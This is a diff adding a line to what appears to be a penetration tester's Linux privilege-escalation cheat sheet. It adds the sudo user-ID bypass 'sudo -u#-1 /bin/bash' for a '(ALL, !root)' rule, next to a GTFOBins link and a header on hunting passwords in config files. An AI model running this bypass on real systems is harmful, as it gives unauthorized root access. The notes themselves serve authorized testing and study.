@@ -20,6 +20,9 @@ sudo -i
 # Search sudo Permissions 
 https://gtfobins.github.io/
 
+# (ALL, !root) /bin/bash
+sudo -u#-1 /bin/bash
+
 ==============================================================================
 [+] Search Passwords on Config Files
 ==============================================================================
